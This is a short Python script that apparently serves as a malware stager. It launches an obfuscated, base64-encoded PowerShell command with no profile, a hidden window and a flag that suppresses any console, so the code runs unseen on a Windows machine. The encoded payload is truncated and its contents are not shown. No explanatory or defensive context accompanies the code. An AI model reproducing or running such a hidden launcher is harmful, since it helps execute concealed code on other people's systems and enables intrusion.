import subprocess

launcher = r"""powershell -noP -sta -w 1 -enc SQBmACgA..."""

subprocess.Popen(launcher, shell=True, creationflags=0x08000000)
